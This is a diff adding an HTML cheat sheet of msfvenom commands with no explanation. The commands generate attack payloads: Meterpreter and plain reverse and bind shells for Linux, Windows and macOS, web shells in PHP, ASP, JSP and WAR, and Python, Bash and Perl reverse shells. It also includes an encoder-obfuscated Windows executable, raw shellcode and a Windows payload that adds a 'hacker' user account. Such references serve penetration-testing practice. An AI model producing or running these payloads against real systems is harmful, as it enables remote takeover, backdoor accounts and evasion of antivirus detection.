@@ -1,0 +1,75 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>msfVenom/ meterpreter</title>
+</head><body><span style="font-size: 13pt"><br/>
+<b>List payloads<br/>
+</b>msfvenom -l<br/>
+<br/>
+<b>Binaries Payloads</b><br/>
+<br/>
+<b>Linux Meterpreter Reverse Shell<br/>
+</b>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf<br/>
+<br/>
+<b>Linux Bind Meterpreter Shell<br/>
+</b>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf<br/>
+<br/>
+<b>Linux Bind Shell<br/>
+</b>msfvenom -p generic/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf<br/>
+<br/>
+<b>Windows Meterpreter Reverse TCP Shell</b><br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe<br/>
+<br/>
+<b>Windows Reverse TCP Shell</b><br/>
+msfvenom -p windows/shell/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe<br/>
+<br/>
+<b>Windows Encoded Meterpreter Windows Reverse Shell</b><br/>
+msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe<br/>
+<br/>
+<b>Mac Reverse Shell</b><br/>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho<br/>
+<br/>
+<b>Mac Bind Shell</b><br/>
+msfvenom -p osx/x86/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho<br/>
+<br/>
+<b>Web Payloads</b><br/>
+<br/>
+<b>PHP Meterpreter Reverse TCP</b><br/>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php<br/>
+cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br/>
+<br/>
+<b>ASP Meterpreter Reverse TCP</b><br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp<br/>
+<br/>
+<b>JSP Java Meterpreter Reverse TCP</b><br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp<br/>
+<br/>
+<b>WAR</b><br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war<br/>
+<br/>
+<b>Scripting Payloads<br/>
+<br/>
+</b><b>Python Reverse Shell</b><br/>
+msfvenom -p cmd/unix/reverse_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py<br/>
+<br/>
+<b>Bash Unix Reverse Shell</b><br/>
+msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh<br/>
+<br/>
+<b>Perl Unix Reverse shell</b><br/>
+msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl<br/>
+<br/>
+<b>Shellcode</b><br/>
+<br/>
+Windows Meterpreter Reverse TCP Shellcode<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;<br/>
+<br/>
+<b>Linux Meterpreter Reverse TCP Shellcode</b><br/>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;<br/>
+<br/>
+<b>Mac Reverse TCP Shellcode</b><br/>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;<br/>
+<br/>
+<b>Create User</b><br/>
+msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe<br/>
+ <br/>
+</span><img src="image.png"/></body></html>
